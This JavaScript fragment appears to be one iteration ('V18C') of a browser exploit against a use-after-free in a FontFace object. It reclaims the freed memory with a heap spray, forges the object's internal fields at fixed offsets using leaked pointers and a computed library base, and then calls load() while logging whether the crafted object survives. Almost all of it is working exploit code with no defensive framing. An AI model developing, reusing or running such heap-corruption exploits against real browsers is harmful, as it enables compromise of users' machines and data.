// V18C Patch: Fully-Valid Face Craft
// Addresses V18B finding: reclaimed face with no modifications crashes
//
// ROOT CAUSE: The reclaimed 192B buffer doesn't have valid field pointers.
// When load() → pump() tries to access m_sources, m_clients, promise, etc.,
// it dereferences invalid pointers and crashes.
//
// SOLUTION: Craft ALL required fields with valid values BEFORE calling load().

/* ==== V18C: FULLY-VALID FACE CRAFT ====
 *
 * V18B FINDING: Reclaimed face with NO modifications crashes on load().
 * This means the reclaim itself doesn't provide valid field pointers.
 *
 * V18C crafts a fully-valid face:
 * 1. Valid m_sources vector (empty, size=0, capacity=0)
 * 2. Valid m_clients table (nullptr for Phase 1)
 * 3. Valid promise object (nullptr or valid pointer)
 * 4. Valid timer fields (zeroed, m_thread=null)
 * 5. Valid status (Pending=0)
 * 6. Valid FontLoadTimingOverride (Block=1)
 *
 * Then attempts load() and reports which configuration survives.
 */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&l2raw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V18C-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      /* Save pre-state for witness */
      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ==== CRAFT FULLY-VALID FACE ==== */
      bs('V18C-CRAFT-START');

      /* 1. STATUS: Pending (0) */
      hitBuf[0x82]=0;
      bs('V18C-FIELD-status=Pending');

      /* 2. FONTLOADTIMINGOVERRIDE: Block (1) - infinite block period, no timer */
      hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;  /* blanket for safety */
      bs('V18C-FIELD-override=Block');

      /* 3. M_SOURCES: Empty vector (pointer=0, size=0, capacity=0)
       * pump() will skip the source loop entirely when m_sources.size()==0.
       * This is the KEY fix - V18B crashed because m_sources had garbage pointers.
       */
      for(var sz=0x28;sz<=0x37;sz++)hitBuf[sz]=0;
      bs('V18C-FIELD-sources=empty');

      /* 4. M_CLIENTS: Null table pointer (Phase 1 control)
       * With m_table==nullptr, WeakHashSet cleanup is a no-op.
       */
      for(var i=0;i<8;i++)hitBuf[0x58+i]=0;
      bs('V18C-FIELD-clients=nullptr');

      /* 5. HASH TABLE OBJECT HEADER: {3, 0x200} from real face
       * These are operation counters, not used when m_table is null.
       */
      hitBuf[0x60]=3; hitBuf[0x61]=0; hitBuf[0x62]=0; hitBuf[0x63]=0;
      hitBuf[0x64]=0; hitBuf[0x65]=2; hitBuf[0x66]=0; hitBuf[0x67]=0;
      bs('V18C-FIELD-htobj={3,0x200}');

      /* 6. M_WRAPPER: Keep the leaked WeakPtr impl pointer (L2)
       * This is at face+0x68. It's already set from the reclaim.
       * We don't modify it.
       */
      bs('V18C-FIELD-wrapper=kept');

      /* 7. TIMER REGION: Zeroed (inactive)
       * m_thread=null, m_unalignedNextFireTime=0, m_heapItem=null
       * With Block override, timer should not fire, but zero it for safety.
       */
      for(var tz=0x88;tz<=0xBF;tz++)hitBuf[tz]=0;
      bs('V18C-FIELD-timer=zeroed');

      /* 8. M_LOADEDPROMISE: Null (no promise)
       * For the JS binding, load() may try to access the promise.
       * Setting it to null should be safe (the binding checks for null).
       */
      for(var pb=0;pb<8;pb++)hitBuf[0x18+pb]=0;
      bs('V18C-FIELD-promise=null');

      /* 9. SOURCES POPULATED: Set to 1 (true)
       * This tells pump() that sources have been populated.
       * Prevents fontLoadEventOccurred from trying to populate sources.
       */
      hitBuf[0x83]=1;
      bs('V18C-FIELD-sourcesPopulated=1');

      bs('V18C-CRAFT-COMPLETE');

      /* ==== TEST: LOAD WITH FULLY-VALID FACE ==== */
      bs('V18C-LOAD-PRE');
      var loadReturned=false;
      var loadThrew=false;
      var loadError='';

      try{
        faces[zi].load();
        loadReturned=true;
        bs('V18C-LOAD-RETURNED');
      }catch(e){
        loadThrew=true;
        loadError=String(e&&e.message?e.message:'?');
        bs('V18C-LOAD-THREW-'+loadError);
      }

      /* ==== POST-LOAD ANALYSIS ==== */
      bs('V18C-POST-LOAD-returned='+loadReturned+'-threw='+loadThrew);

      /* Final status read */
      var finalStatus=hitBuf[0x82];
      bs('V18C-STATUS-AFTER='+finalStatus);

      /* Check if status changed (expected: Pending→Loading→Failure or stays Pending) */
      if(finalStatus===0){
        bs('V18C-STATUS-UNCHANGED-Pending');
      }else if(finalStatus===1){
        bs('V18C-STATUS-CHANGED-Loading');
      }else if(finalStatus===4){
        bs('V18C-STATUS-CHANGED-Failure');
      }else{
        bs('V18C-STATUS-UNEXPECTED='+finalStatus);
      }

      /* Witness check */
      var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
      var diffs=[];
      for(var wq=0;wq<0x100;wq+=8){
        var cur=0n,old=0n;
        for(var wb=0;wb<8;wb++){
          cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
          old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
        }
        if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
      }
      if(diffs.length)bs('V18C-WIT-WRITE-'+diffs.slice(0,8).join('|'));
      else bs('V18C-WIT-nowrite');

      /* Restore original table pointer */
      for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
      bs('V18C-RESTORED');

      /* Verdict */
      if(loadReturned){
        verd('ok','V18C fully-valid face load() SUCCESS');
        bs('V18C-DONE-SUCCESS');
      }else{
        verd('err','V18C fully-valid face load() FAILED');
        bs('V18C-DONE-FAILED');
      }

    }else bs('V18C-SKIP-bad-idx');
  }else bs('V18C-SKIP-missing-data');
}catch(e18c){bs('V18C-ERR-'+String(e18c&&e18c.message?e18c.message:'?'));}
/* ==== V18C END ==== */
